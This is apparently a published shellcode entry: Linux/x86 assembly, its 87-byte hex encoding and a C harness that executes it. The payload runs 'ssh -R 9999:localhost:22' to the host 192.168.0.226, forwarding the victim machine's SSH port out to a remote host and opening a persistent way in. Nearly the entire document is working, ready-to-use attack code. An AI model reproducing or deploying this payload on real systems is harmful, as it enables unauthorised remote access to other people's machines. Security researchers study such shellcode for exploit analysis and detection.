/*****************************************************
 * Linux/x86 Remote Port forwarding 87 bytes         *
 * ssh -R 9999:localhost:22 192.168.0.226            *
 *****************************************************
 * Author: Hamza Megahed                             *
 *****************************************************
 * Twitter: @Hamza_Mega                              *
 *****************************************************
 * blog: hamza-mega[dot]blogspot[dot]com             *
 *****************************************************
 * E-mail: hamza[dot]megahed[at]gmail[dot]com        *
 *****************************************************/

xor    %eax,%eax
push   %eax
pushl  $0x3632322e
pushl  $0x30302e38
pushl  $0x36312e32
pushw  $0x3931
movl   %esp,%esi
push   %eax
push   $0x32323a74
push   $0x736f686c
push   $0x61636f6c
push   $0x3a393939
pushw  $0x3930
movl   %esp,%ebp
push   %eax
pushw  $0x522d
movl   %esp,%edi
push   %eax
push   $0x6873732f
push   $0x6e69622f
push   $0x7273752f
movl   %esp,%ebx
push   %eax
push   %esi
push   %ebp
push   %edi
push   %ebx
movl   %esp,%ecx
mov    $0xb,%al
int    $0x80

********************************
#include <stdio.h>
#include <string.h>

char *shellcode =
"\x31\xc0\x50\x68\x2e\x32\x32\x36\x68\x38\x2e\x30\x30\x68\x32\x2e\x31\x36"
"\x66\x68\x31\x39\x89\xe6\x50\x68\x74\x3a\x32\x32\x68\x6c\x68\x6f\x73\x68"
"\x6c\x6f\x63\x61\x68\x39\x39\x39\x3a\x66\x68\x30\x39\x89\xe5\x50\x66\x68"
"\x2d\x52\x89\xe7\x50\x68\x2f\x73\x73\x68\x68\x2f\x62\x69\x6e\x68\x2f\x75"
"\x73\x72\x89\xe3\x50\x56\x55\x57\x53\x89\xe1\xb0\x0b\xcd\x80";




int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}